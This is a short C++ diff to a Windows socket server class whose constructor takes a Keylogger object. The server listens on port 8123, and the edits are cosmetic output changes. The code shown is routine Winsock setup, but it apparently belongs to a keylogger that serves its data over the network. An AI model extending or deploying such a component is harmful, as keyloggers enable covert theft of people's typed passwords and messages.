@@ -33,7 +33,7 @@ void SocketServer::initHostInfo() {
 SocketServer::SocketServer(Keylogger* logger) {
 	listenSocket = INVALID_SOCKET;
 
-	std::cout << "socket";
+	std::wcout << L"socket";
 	WSADATA wsaData;
 	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (result != 0) {
@@ -51,7 +51,7 @@ SocketServer::SocketServer(Keylogger* logger) {
 	hints.ai_flags = AI_PASSIVE;
 
 	this->initHostInfo();
-	std::cout << this->ip << " " << this->hostName << std::endl;
+	//std::cout << this->ip << " " << this->hostName << std::endl;
 
 	result = getaddrinfo(ip.c_str(), "8123", &hints, &addr);
 
@@ -90,7 +90,7 @@ void SocketServer::start() {
 
 	while (true) {
 		clientSocket = accept(this->listenSocket, NULL, NULL);
-		std::cout << "accepted client: " << clientSocket << std::endl;
+		std::wcout << L"accepted client: " << clientSocket << std::endl;
 
 		if (clientSocket == INVALID_SOCKET) {
 			cerr << "accept failed: " << WSAGetLastError() << std::endl;
